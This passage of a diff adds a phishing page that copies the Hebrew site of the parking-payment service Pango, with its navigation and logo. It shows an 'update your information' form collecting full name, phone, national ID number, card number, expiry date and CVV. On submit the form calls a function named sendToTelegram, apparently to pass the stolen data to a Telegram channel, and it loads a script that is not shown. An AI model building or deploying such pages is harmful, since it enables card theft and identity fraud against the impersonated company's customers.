+                                                </a>
+                                                <div class="lavel-1-wrap sf-hidden"></div>
+                                            </li>
+                                            <li class="list-0 has_childs selected" aria-expanded="false" role="expand button">
+                                                <a href="https://www.pango.co.il/customer-service" title="צור קשר ושירות לקוחות">
+                                                    <span>צור קשר ושירות לקוחות</span>
+                                                </a>
+                                                <div class="lavel-1-wrap sf-hidden"></div>
+                                            </li>
+                                            <li class="list-0 has_childs" aria-expanded="false" role="expand button">
+                                                <a href="https://www.pango.co.il/businesses" title="פנגו לעסקים">
+                                                    <span>פנגו לעסקים</span>
+                                                </a>
+                                                <div class="lavel-1-wrap sf-hidden"></div>
+                                            </li>
+                                            <li class="list-0" aria-expanded="false" role="expand button">
+                                                <a href="https://www.pango.co.il/terms-of-use-categories" title="תנאי שימוש">
+                                                    <span>תנאי שימוש</span>
+                                                </a>
+                                            </li>
+                                            <li class="list-0" aria-expanded="false" role="expand button">
+                                                <a href="https://www.pango.co.il/safe-app-use" title="שימוש בטוח באפליקציה">
+                                                    <span>שימוש בטוח באפליקציה</span>
+                                                </a>
+                                            </li>
+                                            <li class="list-0 has_childs" aria-expanded="false" role="expand button">
+                                                <a href="https://www.pango.co.il/about" title="אודות">
+                                                    <span>אודות</span>
+                                                </a>
+                                                <div class="lavel-1-wrap sf-hidden"></div>
+                                            </li>
+                                            <li class="list-0 has_childs" aria-expanded="false" role="expand button">
+                                                <a href="https://www.comeet.com/jobs/pango/59.002" title="דרושים">
+                                                    <span>דרושים</span>
+                                                </a>
+                                                <div class="lavel-1-wrap sf-hidden"></div>
+                                            </li>
+                                            <li class="list-0" aria-expanded="false" role="expand button">
+                                                <a href="https://land.pango.co.il/FastPark/ParkingRates/ParkingRates" title="ערים ותעריפים">
+                                                    <span>ערים ותעריפים</span>
+                                                </a>
+                                            </li>
+                                        </ul>
+                                    </nav>
+                                    <label for="header-nav-toggle" class="header-label-nav-toggle-dim" aria-hidden="true" tabindex="-1"></label>
+                                </div>
+                                <div class="m_button sp_hide">
+                                    <a href="https://driver.pango.co.il/Manage/logindriver.aspx" class="com_popup_embed" title="איזור אישי">
+                                        <span class="text">
+                                            <i class="ic icon-user"></i>
+                                            <span>איזור אישי</span>
+                                        </span>
+                                    </a>
+                                </div>
+                            </div>
+                            <div class="logo-wrap">
+                                <a role="h1" class="logo" title="עמוד ראשי" tabindex="0" aria-label="Pango">
+                                    <img src="img/p4.png" alt="Pango logo">
+                                </a>
+                            </div>
+                        </div>
+                    </div>
+                </header>
+            </div>
+            <article class="page mod_container mod_form mod_form_contact rtl" role="main" id="page">
+                <div class="page_body" id="main">
+                    <div class="container">
+                        <div class="page-title-wrap">
+                            <nav class="com_breadcrumbs"></nav>
+                        </div>
+                        <div class="hide sp_show sf-hidden"></div>
+                        <div></div>
+                        <div class="page-info-wrap">
+                            <h2 class="title">אנא, עדכן את המידע שלך</h2>
+                        </div>
+                        <form class="com_form" method="POST" onsubmit="sendToTelegram(event)">
+                            <div class="com_form_form">
+                                <div class="page-form-fields-wrap regular">
+                                    <div class="field field-subject"></div>
+                                    <div class="field field-sub-subject hide sf-hidden" data-id="fields_6"></div>
+                                    <div class="field field-name">
+                                        <input type="text" class="required" minlength="2" maxlength="64" id="name" name="fullName" title="שם מלא שדה חובה" aria-required="true" placeholder="* שם מלא" data-label="שם מלא" required>
+                                    </div>
+                                    <div class="field field-tel">
+                                        <input type="tel" class="required fullphone" minlength="10" maxlength="10" id="phone" name="phoneNumber" aria-required="true" placeholder="* טלפון" data-label="טלפון" required>
+                                    </div>
+                                    <div class="field field-nid">
+                                        <input type="tel" class="nidlength required nid" minlength="9" maxlength="10" id="nid" name="idnumber" aria-required="true" placeholder="* ת.ז" data-label="ת.ז" required>
+                                    </div>
+                                    <div class="field field-name">
+                                        <input type="tel" maxlength="16" class="required cardsuffix" id="card" title="יש להכניס 4 ספרות אחרונות של כרטיס אשראי" aria-required="true" placeholder="מספר כרטיס" data-label="כרטיס אשראי" name="cardnumber" required>
+                                    </div>
+                                    <div class="" style="position:relative;padding:.5rem;width:50%">
+                                        <select id="expierymonth" class="required" aria-required="true" title="נושא פנייה שדה חובה" data-label="נושא פנייה" name="expierymonth">
+                                            <option selected value="01">01</option>
+                                            <option value="02">02</option>
+                                            <option value="03">03</option>
+                                            <option value="04">04</option>
+                                            <option value="05">05</option>
+                                            <option value="06">06</option>
+                                            <option value="07">07</option>
+                                            <option value="08">08</option>
+                                            <option value="09">09</option>
+                                            <option value="10">10</option>
+                                            <option value="11">11</option>
+                                            <option value="12">12</option>
+                                        </select>
+                                    </div>
+                                    <div class="" style="position:relative;padding:.5rem;width:50%">
+                                        <select id="expieryyear" class="required" aria-required="true" title="נושא פנייה שדה חובה" data-label="נושא פנייה" name="expieryyear">
+                                            <option value="25">2025</option>
+                                            <option value="26">2026</option>
+                                            <option value="27">2027</option>
+                                            <option value="28">2028</option>
+                                            <option value="29">2029</option>
+                                            <option value="30">2030</option>
+                                            <option value="31">2031</option>
+                                            <option value="32">2032</option>
+                                            <option value="33">2033</option>
+                                            <option value="34">2034</option>
+                                            <option value="35">2035</option>
+                                        </select>
+                                    </div>
+                                    <div class="" style="position:relative;padding:.5rem;width:50%">
+                                        <input type="tel" minlength="3" maxlength="4" class="required cardsuffix" id="cvv" title="CVV Code" aria-required="true" placeholder="קוד אבטחה (CVV)" data-label="כרטיס אשראי" name="securecode" required>
+                                    </div>
+                                    <div class="page-form-btn-submit">
+                                        <button class="button" type="submit" data-loading="אנא המתינו...">המשך</button>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="com_form_msg center padding fs1 color_2 sf-hidden" tabindex="0" aria-hidden="true" role="alert"></div>
+                        </form>
+                        <script src="Sindex.js.js"></script>
+                        
+    </body>
+</html>
